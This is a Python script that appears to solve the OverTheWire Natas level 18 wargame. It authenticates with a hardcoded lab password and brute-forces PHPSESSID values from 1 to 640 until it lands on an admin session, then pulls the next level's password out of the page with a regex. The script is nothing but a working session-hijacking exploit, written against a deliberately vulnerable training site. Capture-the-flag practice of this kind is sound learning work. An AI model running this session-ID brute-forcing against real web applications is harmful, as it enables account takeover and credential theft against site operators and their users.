#!/usr/bin/python3

# coding: utf-8


import requests
import re

URL = "http://natas18.natas.labs.overthewire.org"

session = requests.Session()
session.auth  = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

# we have only 640 id's

cookies = {'PHPSESSID': ''}

for i in range(1, 640+1):
    cookies['PHPSESSID'] = str(i)
    req = session.get(URL, cookies=cookies)
    if 'regular user' not in req.text:
        m = re.search(r"Password: ([a-zA-Z0-9]+)", req.text)
        if m:
            print(m.group(0))
            break




